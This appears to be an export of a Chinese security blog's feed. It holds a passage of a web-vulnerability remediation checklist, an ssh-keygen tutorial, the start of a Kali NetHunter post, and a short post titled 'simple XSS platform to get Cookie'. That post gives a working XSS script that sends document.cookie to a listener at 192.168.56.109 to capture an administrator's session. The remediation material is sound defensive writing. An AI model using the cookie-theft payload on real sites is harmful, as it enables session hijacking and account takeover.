<p>　　1、禁用不需要的协议，只允许HTTP和HTTPS请求，可以防止类似于file:&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F; 等引起的问题。</p>
<p>　　2、白名单的方式限制访问的目标地址，禁止对内网发起请求</p>
<p>　　3、过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
<p>　　4、验证请求的文件格式</p>
<p>　　5、禁止跳转</p>
<p>　　6、限制请求的端口为http常用的端口，比如 80、443、8080、8000等</p>
<p>　　7、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
<h2 id="6-任意命令-x2F-代码执行"><a href="#6-任意命令-x2F-代码执行" class="headerlink" title="6.任意命令&#x2F;代码执行"></a>6.任意命令&#x2F;代码执行</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。攻击者可在服务器上执行任意命令，读写文件操作等，危害巨大。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、严格过滤用户输入的数据，禁止执行非预期系统命令。</p>
<p>　　2、减少或不使用代码或命令执行函数</p>
<p>　　3、客户端提交的变量在放入函数前进行检测</p>
<p>　　4、减少或不使用危险函数</p>
<h2 id="7-任意文件上传"><a href="#7-任意文件上传" class="headerlink" title="7.任意文件上传"></a>7.任意文件上传</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测，重命名文件，MIME类型检测以及限制上传文件的大小等限制来防御，或是将上传的文件其他文件存储服务器中。</p>
<p>　　2、严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关上传文件目录的执行权限，防止木马执行。</p>
<p>　　3、对上传文件格式进行严格校验，防止上传恶意脚本文件；</p>
<p>　　4、严格限制上传的文件路径。</p>
<p>　　5、文件扩展名服务端白名单校验。</p>
<p>　　6、文件内容服务端校验。</p>
<p>　　7、上传文件重命名。</p>
<p>　　8、隐藏上传文件路径。</p>
<h2 id="8-目录穿越-x2F-目录遍历"><a href="#8-目录穿越-x2F-目录遍历" class="headerlink" title="8.目录穿越&#x2F;目录遍历"></a>8.目录穿越&#x2F;目录遍历</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符..&#x2F;跳出程序本身的限制目录，来下载或显示任意文件。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　对传入的文件名参数进行过滤，并且判断是否是允许获取的文件类型，过滤回溯符..&#x2F;。</p>
<h2 id="9-文件包含"><a href="#9-文件包含" class="headerlink" title="9.文件包含"></a>9.文件包含</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、严格检查变量是否已经初始化。</p>
<p>　　2、对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现.&#x2F;和..&#x2F;等目录跳转符。</p>
<p>　　3、严格检查文件包含函数中的参数是否外界可控。</p>
<h2 id="10-弱口令"><a href="#10-弱口令" class="headerlink" title="10.弱口令"></a>10.弱口令</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　由于网站用户帐号存在弱口令，导致攻击者通过弱口令可轻松登录到网站中，从而进行下一步的攻击，如上传webshell，获取敏感数据。</p>
<p>　　另外攻击者利用弱口令登录网站管理后台，可执行任意管理员的操作。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、强制用户首次登录时修改默认口令，或是使用用户自定义初始密码的策略；</p>
<p>　　2、完善密码策略，信息安全最佳实践的密码策略为8位（包括）以上字符，包含数字、大小写字母、特殊字符中的至少3种。</p>
<p>　　3、增加人机验证机制，限制ip访问次数。</p>
<h2 id="11-暴力破解"><a href="#11-暴力破解" class="headerlink" title="11.暴力破解"></a>11.暴力破解</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　由于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险)</p>
<p>　　2、如果某个 IP登录次数超过设置的阈值，则锁定IP</p>
<p>　　3、增加人机验证机制</p>
<p>　　4、验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。</p>
<h2 id="12-越权访问"><a href="#12-越权访问" class="headerlink" title="12.越权访问"></a>12.越权访问</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、对用户访问角色的权限进行严格的检查及限制。</p>
<p>　　2、在一些操作时可以使用session对用户的身份进行判断和控制</p>
<h2 id="13-未授权访问"><a href="#13-未授权访问" class="headerlink" title="13.未授权访问"></a>13.未授权访问</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、页面进行严格的访问权限的控制以及对访问角色进行权限检查。</p>
<p>　　2、可以使用session对用户的身份进行判断和控制。</p>
<h2 id="14-列目录"><a href="#14-列目录" class="headerlink" title="14.列目录"></a>14.列目录</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　由于web服务器配置不当，开启了目录浏览，攻击者可获得服务器上的文件目录结构，获取敏感文件。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、通过修改配置文件，禁止中间件（如IIS、apache、tomcat）的文件目录索引功能</p>
<p>　　2、设置目录访问权限</p>
<h2 id="15-PHP反序列化"><a href="#15-PHP反序列化" class="headerlink" title="15.PHP反序列化"></a>15.PHP反序列化</h2><p><strong>漏洞描述</strong></p>
<p>　　php反序列化漏洞也叫PHP对象注入，形成原因为程序未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行、文件操作、执行数据库操作等不可控后果。这一类攻击在java、python等面向对象语言中均存在。</p>
<p>可参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE2NzcyMS5odG1s">https://www.freebuf.com/articles/web/167721.html<i class="fa fa-external-link-alt"></i></span></p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、对传入的对象进行严格的过滤检查</p>
<p>　　2、在反序列化过程执行的文件读写、命令或代码执行函数中是否有用户可控的参数。</p>
<h2 id="16-http-slow拒绝服务攻击"><a href="#16-http-slow拒绝服务攻击" class="headerlink" title="16.http slow拒绝服务攻击"></a>16.http slow拒绝服务攻击</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　按照设计，HTTP协议要求服务器在处理之前完全接收请求。 如果HTTP请求没有完成，或者传输速率非常低，服务器会保持其资源忙于等待其余数据。如果服务器保持太多的资源请求和处理，这将造成一个拒绝服务。严重者一台主机即可让web运行缓慢甚至是崩溃。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　对于 Apache 可以做以下优化（其他服务器原理相同）：</p>
<p>　　1、设置合适的 timeout 时间（Apache 已默认启用了 reqtimeout 模块），规定了 Header 发送的时间以及频率和 Body 发送的时间以及频率</p>
<p>　　2、增大 MaxClients(MaxRequestWorkers)：增加最大的连接数。根据官方文档，两个参数是一回事，版本不同，MaxRequestWorkers was called MaxClients before version 2.3.13.Theold name is still supported.</p>
<p>　　3、默认安装的 Apache 存在 Slow Attack 的威胁，原因就是虽然设置的 timeoute，但是最大连接数不够，如果攻击的请求频率足够大，仍然会占满Apache的所有连接</p>
<h2 id="17-CRLF注入"><a href="#17-CRLF注入" class="headerlink" title="17.CRLF注入"></a>17.CRLF注入</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　CRLF 是“回车 +换行”（\r\n）的简称。在 HTTP 协议中，HTTPHeader 与 HTTP Body 是用两个 CRLF 符号进行分隔的，浏览器根据这两个 CRLF 符号来获取 HTTP 内容并显示。因此，一旦攻击者能够控制 HTTP 消息头中的字符，注入一些恶意的换行，就能注入一些会话 Cookie 或者 HTML 代码。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、过滤 \r 、\n 及其各种编码的换行符，避免输入的数据污染到其他 HTTP 消息头。</p>
<h2 id="18-LDAP注入"><a href="#18-LDAP注入" class="headerlink" title="18.LDAP注入"></a>18.LDAP注入</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　由于Web 应用程序没有对用户发送的数据进行适当过滤和检查，攻击者可修改LDAP 语句的结构，并且以数据库服务器、Web 服务器等的权限执行任意命令，许可权可能会允许查询、修改或除去 LDAP 树状构造内任何数据。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　对用户的输入内容进行严格的过滤。</p>
<h2 id="19-URL-跳转"><a href="#19-URL-跳转" class="headerlink" title="19.URL 跳转"></a>19.URL 跳转</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、在进行页面跳转前校验传入的URL是否为可信域名。</p>
<p>　　2、白名单规定跳转链接</p>
<h2 id="20-明文传输"><a href="#20-明文传输" class="headerlink" title="20.明文传输"></a>20.明文传输</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　用户登录过程中使用明文传输用户登录信息，若用户遭受中间人攻击时，攻击者可直接获取该用户登录账户，从而进行进一步渗透。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、用户登录信息使用加密传输，如密码在传输前使用安全的算法加密后传输，可采用的算法包括：不可逆hash算法加盐（4位及以上随机数，由服务器端产生）；安全对称加密算法，如AES(128、192、256位)，且必须保证客户端密钥安全，不可被破解或读出；非对称加密算法，如RSA(不低于1024位)、SM2等。</p>
<p>　　2、使用https来保证传输的安全。</p>
<h2 id="21-网页木马"><a href="#21-网页木马" class="headerlink" title="21.网页木马"></a>21.网页木马</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　经渗透测试发现目标站点存在webshell，攻击者可直接爆破口令使用木马，非常低成本的进行恶意操作。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、确认并删除木马文件，并进行本地文件漏洞扫描排查是否还存在有其他木马。</p>
<p>　　2、发现并及时修复已存在的漏洞。</p>
<p>　　3、通过查看日志、服务器杀毒等安全排查，确保服务器未被留下后门</p>
<h2 id="22-备份文件泄露"><a href="#22-备份文件泄露" class="headerlink" title="22.备份文件泄露"></a>22.备份文件泄露</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　网站备份文件或、敏感信息文件存放在某个网站目录下，攻击者可通过文件扫描等方法发现并下载该备份文件，导致网站敏感信息泄露。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、不在网站目录下存放网站备份文件或敏感信息的文件。</p>
<p>　　2、如需存放该类文件，请将文件名命名为难以猜解的无规则字符串。</p>
<h2 id="23-敏感信息泄露"><a href="#23-敏感信息泄露" class="headerlink" title="23.敏感信息泄露"></a>23.敏感信息泄露</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。</p>
<p>　　2、不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。</p>
<p>　　3、在服务器端对相关敏感信息进行模糊化处理。</p>
<p>　　4、对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。</p>
<h2 id="24-短信-x2F-邮件轰炸"><a href="#24-短信-x2F-邮件轰炸" class="headerlink" title="24.短信&#x2F;邮件轰炸"></a>24.短信&#x2F;邮件轰炸</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　由于没有对短信或者邮件发送次数进行限制，导致可无限次发送短信或邮件给用户，从而造成短信轰炸，进而可能被大量用户投诉，从而影响公司声誉。<br>短信轰炸攻击时常见的一种攻击，攻击者通过网站页面中所提供的发送短信验证码的功能处，通过对其发送数据包的获取后，进行重放，如果服务器短信平台未做校验的情况时，系统会一直去发送短信，这样就造成了短信轰炸的漏洞。</p>
<p>攻击者通过填写他人的手机号，使用软件burpsuite的intruder功能重复提交发送短信的请求包，达到短时间内向他人的手机上发送大量垃圾短信的目的。</p>
<p>恶意攻击者可以利用漏洞攻击做到：</p>
<p>可对任意手机号轰炸-高危<br>只可对当前手机号轰炸-中危</p>
<p>　　<strong>修复建议</strong></p>
<p>　　在服务器限制发送短信或邮件的频率，如同一账号1分钟只能发送1次短信或邮件，一天只能发送3次。</p>
<h2 id="25-phpinfo信息泄漏"><a href="#25-phpinfo信息泄漏" class="headerlink" title="25.phpinfo信息泄漏"></a>25.phpinfo信息泄漏</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息，造成服务器信息泄露，为攻击提供有利的信息。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、删除phpinfo 函数。</p>
<p>　　2、若文件无用可直接删除。 </p>
<h2 id="26-IIS短文件名泄露漏洞"><a href="#26-IIS短文件名泄露漏洞" class="headerlink" title="26.IIS短文件名泄露漏洞"></a>26.IIS短文件名泄露漏洞</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　Internet Information Services（IIS，互联网信息服务）是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。 Microsoft IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。危害：攻击者可以利用“~”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。</p>
<p>　　攻击者可通过该漏洞尝试获取网站服务器文件的文件名，达到获取更多信息来入侵服务器的目的。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　修改Windows配置，关闭短文件名功能。</p>
<p>　　1.关闭NTFS 8.3文件格式的支持。该功能默认是开启的，对于大多数用户来说无需开启。</p>
<p>　　2.如果是虚拟主机空间用户,可采用以下修复方案：</p>
<p>　　1）修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)。</p>
<p>　　2）如果你的web环境不需要asp.net的支持你可以进入Internet 信息服务(IIS)管理器 — Web 服务扩展 - ASP.NET 选择禁止此功能。</p>
<p>　　3）升级net framework 至4.0以上版本。</p>
<p>　　3.将web文件夹的内容拷贝到另一个位置，比如D:\www到D:\<span class="exturl" data-url="aHR0cDovL3d3dy5iYWNrLOeEtuWQjuWIoOmZpOWOn+aWh+S7tuWkuWQvd3d3JUVGJUJDJThDJUU1JTg2JThEJUU5JTg3JThEJUU1JTkxJUJEJUU1JTkwJThERDovd3d3LmJhY2slRTUlODglQjBEOi93d3clRTMlODAlODIlRTUlQTYlODIlRTYlOUUlOUMlRTQlQjglOEQlRTklODclOEQlRTYlOTYlQjAlRTUlQTQlOEQlRTUlODglQjYlRUYlQkMlOEMlRTUlQjclQjIlRTclQkIlOEYlRTUlQUQlOTglRTUlOUMlQTglRTclOUElODQlRTclOUYlQUQlRTYlOTYlODclRTQlQkIlQjYlRTUlOTAlOEQlRTUlODglOTklRTYlOTglQUYlRTQlQjglOEQlRTQlQkMlOUElRTYlQjYlODglRTUlQTQlQjElRTclOUElODQlRTMlODAlODI=">www.back，然后删除原文件夹D:\www，再重命名D:\www.back到D:\www。如果不重新复制，已经存在的短文件名则是不会消失的。<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="27-应用程序错误信息泄露"><a href="#27-应用程序错误信息泄露" class="headerlink" title="27.应用程序错误信息泄露"></a>27.应用程序错误信息泄露</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　攻击者可通过特殊的攻击向量，使web服务器出现500、403等相关错误，导致信息泄漏如绝对路径、webserver版本、源代码、sql语句等敏感信息，恶意攻击者很有可能利用这些信息实施进一步的攻击。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、自定义错误页面或使用统一的错误页面提示。</p>
<h2 id="28-Apache-Tomcat默认文件"><a href="#28-Apache-Tomcat默认文件" class="headerlink" title="28.Apache Tomcat默认文件"></a>28.Apache Tomcat默认文件</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　Apache Tomcat默认样例文件没有删除或限制访问，可能存在cookie、session伪造，进行后台登录操作</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、删除样例文件</p>
<p>　　2、限制文件访问权限</p>
<h2 id="29-Crossdomain-xml-配置不当"><a href="#29-Crossdomain-xml-配置不当" class="headerlink" title="29.Crossdomain.xml 配置不当"></a>29.Crossdomain.xml 配置不当</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　网站根目录下的 crossdomain.xml 文件指明了远程Flash 是否可以加载当前网站的资源（图片、网页内容、Flash等）。如果配置不当，可能导致遭受跨站请求伪造（CSRF）攻击。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　对于不需要从外部加载资源的网站，在 crossdomain.xml 文件中更改allow-access-from的domain属性为域名白名单。</p>
<h2 id="30-目标服务器启用了不安全-HTTP-方法"><a href="#30-目标服务器启用了不安全-HTTP-方法" class="headerlink" title="30.目标服务器启用了不安全 HTTP 方法"></a>30.目标服务器启用了不安全 HTTP 方法</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　目标服务器启用了不安全的传输方法，如PUT、TRACE、DELETE、MOVE等，这些方法表示可能在服务器上使用了 WebDAV，由于dav方法允许客户端操纵服务器上的文件，如上传、修改、删除相关文件等危险操作，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、关闭不安全的传输方法，只开启POST、GET方法。</p>
<p>　　2、如果服务器不使用 WebDAV 可直接禁用，或为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码。</p>
<h2 id="31-weblogic-SSRF服务器请求伪造"><a href="#31-weblogic-SSRF服务器请求伪造" class="headerlink" title="31.weblogic SSRF服务器请求伪造"></a>31.weblogic SSRF服务器请求伪造</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　目标存在weblogic SSRF服务器请求伪造漏洞。WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。Weblogic中间件默认带有“UDDI 目录浏览器”且为未授权访问，通过该应用，可进行无回显的SSRF请求。攻击者可利用该漏洞对企业内网进行大规模扫描，了解内网结构，并可能结合内网漏洞直接获取服务器权限。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、若不影响业务则可删除uddiexplorer文件夹</p>
<p>　　2、限制uddiexplorer应用只能内网访问</p>
<h2 id="32-Apache-Struts2-远程代码执行漏洞（S2-019）"><a href="#32-Apache-Struts2-远程代码执行漏洞（S2-019）" class="headerlink" title="32.Apache Struts2 远程代码执行漏洞（S2-019）"></a>32.Apache Struts2 远程代码执行漏洞（S2-019）</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　Apache Struts2的“Dynamic MethodInvocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，如果未关闭此机制将导致远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载。</p>
<p>　　2、或者手工设置struts.xml文件&lt;constantname&#x3D;”struts.enable.DynamicMethodInvocation”value&#x3D;”false”&#x2F;&gt;</p>
<h2 id="33-Apache-Struts2-远程代码执行漏洞（S2-037）"><a href="#33-Apache-Struts2-远程代码执行漏洞（S2-037）" class="headerlink" title="33.Apache Struts2 远程代码执行漏洞（S2-037）"></a>33.Apache Struts2 远程代码执行漏洞（S2-037）</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　Apache Struts2在使用REST插件时，攻击者可以绕过动态方法执行的限制，调用恶意表达式执行远程代码。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　建议用户到官方获取最新补丁或者最新版本程序。</p>
<h2 id="34-Apache-Struts2-DevMode-远程代码执行漏洞"><a href="#34-Apache-Struts2-DevMode-远程代码执行漏洞" class="headerlink" title="34.Apache Struts2 DevMode 远程代码执行漏洞"></a>34.Apache Struts2 DevMode 远程代码执行漏洞</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　为了便于开发人员调试程序，Struts2提供了一个devMode模式，可以方便查看程序错误以及日志等信息。当Struts2中的devMode模式设置为true时，存在严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　建议用户到官方获取最新补丁或者最新版本程序。</p>
<p>　　或者将struts.properties中的devMode设置为false，或是在struts.xml中添加如下代码： &lt;constant name&#x3D;”struts.devMode”value&#x3D;”false”&#x2F;&gt;。</p>
<h2 id="35-Apache-Struts2-远程代码执行漏洞（S2-045）"><a href="#35-Apache-Struts2-远程代码执行漏洞（S2-045）" class="headerlink" title="35.Apache Struts2 远程代码执行漏洞（S2-045）"></a>35.Apache Struts2 远程代码执行漏洞（S2-045）</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　Apache Struts2的Jakarta Multipartparser插件存在远程代码执行漏洞，漏洞编号为CVE-2017-5638。攻击者可以在使用该插件上传文件时，修改HTTP请求头中的Content-Type值来触发该漏洞，导致远程执行代码。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　检测方式查看web目录下&#x2F;WEB-INF&#x2F;lib&#x2F;目录下的struts-core.x.x.jar ，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。</p>
<p>　　1、建议用户到官方获取最新补丁或者最新版本程序。</p>
<p>　　2、更新至Strusts2.3.32或者Strusts2.5.10.1，或使用第三方的防护设备进行防护。</p>
<p>　　3、临时解决方案：删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。</p>
<p>　　4、修改WEB-INF&#x2F;classes目录下的配置</p>
<p>　　在WEB-INF&#x2F;classes目录下的struts.xml中的struts 标签下添加</p>
<p>　　&lt;constantname&#x3D;”struts.custom.i18n.resources”value&#x3D;”global”&#x2F;&gt;；</p>
<p>　　在WEB-INF&#x2F;classes&#x2F;目录下添加global.properties，文件内容如下:</p>
<p>　　struts.messages.upload.error.InvalidContentTypeException&#x3D;1</p>
<h2 id="36-Apache-Struts2-远程代码执行漏洞（S2-033）"><a href="#36-Apache-Struts2-远程代码执行漏洞（S2-033）" class="headerlink" title="36.Apache Struts2 远程代码执行漏洞（S2-033）"></a>36.Apache Struts2 远程代码执行漏洞（S2-033）</h2><p>　　<strong>漏洞描述</strong></p>
<p>　　Apache Struts2在开启动态方法调用（DynamicMethod Invocation）的情况下，攻击者使用REST插件调用恶意表达式可以远程执行代码。</p>
<p>　　<strong>修复建议</strong></p>
<p>　　1、用户到官方获取最新补丁或者最新版本程序。</p>
<p>　　2、或者在允许的情况下禁用动态方法调用（Dynamic Method Invocation），修改Struts2的配置文件struts.xml，将struts.enable.DynamicMethodInvocation设置为“false”。</p>
<h2 id="37-redis相关漏洞修复"><a href="#37-redis相关漏洞修复" class="headerlink" title="37.redis相关漏洞修复"></a>37.redis相关漏洞修复</h2><p>补充来自博客园：@梦猩魂</p>
<p>完善来自博客园：@我超怕的</p>
<p><strong>漏洞描述</strong></p>
<p>redis默认没有口令可能会造成未授权访问造成信息泄露，若redis为高权限账户运行，可能导致服务器权限丢失等。</p>
<p><strong>安全建议</strong></p>
<p>1.禁用一些高危命令</p>
<p>　　常见如：flushdb，flushall，config，keys 等</p>
<p>2.以低权限运行 Redis 服务</p>
<p>3.为 Redis 添加密码验证</p>
<p>4.禁止外网访问 Redis</p>
<p>5.保证 authorized_keys 文件的安全</p>
]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
  </entry>
  <entry>
    <title>ssh-keygen命令基本用法</title>
    <url>/2022/ssh-keygen%E4%BD%BF%E7%94%A8.html</url>
    <content><![CDATA[<p>​            SSH 公钥认证是ssh认证的方式之一。通过公钥认证可实现ssh免密码登陆，在用户目录的home目录下，有一个.ssh的目录，和当前用户ssh配置认证相关的文件，几乎都在这个目录下。</p>
<p><strong>ssh-keygen</strong> 用于生成、管理和转换认证密钥</p>
<h3 id="常用参数："><a href="#常用参数：" class="headerlink" title="常用参数："></a>常用参数：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-t type:指定要生成的密钥类型，有rsa1(SSH1),dsa(SSH2),ecdsa(SSH2),rsa(SSH2)等类型，较为常用的是rsa类型</span><br><span class="line">-f filename:指定生成的密钥文件名字</span><br><span class="line">-C comment：提供一个新的注释</span><br><span class="line">-b bits：指定要生成的密钥长度 (单位:bit)，对于RSA类型的密钥，最小长度768bits,默认长度为2048bits。DSA密钥必须是1024bits</span><br></pre></td></tr></table></figure>

<span id="more"></span>使用 ssh-kengen 会在~/.ssh/目录下生成两个文件，不指定文件名和密钥类型的时候，默认生成的两个文件是：

<p>**id_rsa、id_rsa.pub **</p>
<h3 id="生成密钥对："><a href="#生成密钥对：" class="headerlink" title="生成密钥对："></a>生成密钥对：</h3><p>生成ssh key的时候，可以通过 -f 选项指定生成文件的文件名,-C选项是公钥文件中的备注:s</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@vps .ssh]$ ssh-keygen -t rsa -f test -C &quot;test key&quot;</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br></pre></td></tr></table></figure>

<p>如果文件名是test，结果是:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@vps .ssh]$ ll test*</span><br><span class="line">-rw------- 1 root root 1675 Sep 15 13:24 test</span><br><span class="line">-rw-r--r-- 1 root root 390 Sep 15 13:24 test.pub</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@vps .ssh]$ cat test.pub</span><br><span class="line">ssh-rsa</span><br><span class="line">AAAAB3NzaC1yc2EAAAABIwAAAQEAlgjiMw7AskxbvpQY9rmZPQxQBzh9laxFvbaini2EgmQkNsXBA9WJOXn2YBJauoiVsdUKBWA97avjsobrTxsCYvFr1yQQvTfTlbqlqGNIhQc/3HjTl2pIkClpDWvBrRN+jpyESS4MNbfOL1qjT4c/QhGvj6U6HrN6kUyn58oyyJpTzOLG74AZELJ2Led57QvTw1yJXZuAMWioR0A3BGd25fdocLX3ebux6ya8AsloOVYfsAqGlggrARe6FXjLfMH4a/nxaAdiDYVXU/Vr1ybK9P7SfyEDGJi3JtgiPUlA6vPxUC</span><br><span class="line">E+9IJPQaqqeqCGzrJ6G/XO7om1v9YLLG/H/ZN2tQ== test key</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>简易xss平台 获取Cookie</title>
    <url>/2020/xss%E8%8E%B7%E5%8F%96.html</url>
    <content><![CDATA[<p>1、启用python http服务器</p>
<img src="../images/upload/python3.png" style="zoom:67%;" />

<p>2、在有xss的地方插入截获代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=&quot;http://192.168.56.109/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>+<span class="string">&#x27;&quot; width=0 height=0 border=0 /&gt;&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>3、等待管理员触发漏洞后，便会截获到cookie</p>
<img src="../images/upload/cookie.png" style="zoom: 67%;" />]]></content>
  </entry>
  <entry>
    <title>一加5手机上部署kali nethunter</title>
    <url>/2020/%E4%B8%80%E5%8A%A05%E5%AE%89%E8%A3%85kali%20nethunter.html</url>
    <content><![CDATA[<p>为弘扬中华民族美德-勤俭持家，利用闲暇时间将手中的oneplus 5变废为宝。<br>Kali Linux NetHunter是一个开源的Android渗透测试平台，它可以轻松的使用各种安全工具，详情介绍请查阅官方网站。<br><font color=green>本文章基于oneplus 5手机，其它手机型号方法类似；各项基础知识不在文章赘述范围之内，自行了解；所需全部文件在末尾链接出，下面进入干货环节。</font><span id="more"></span><br><font color=red><strong>数据无价，任何操作前请确认数据已备份</strong>！！！</font></p>
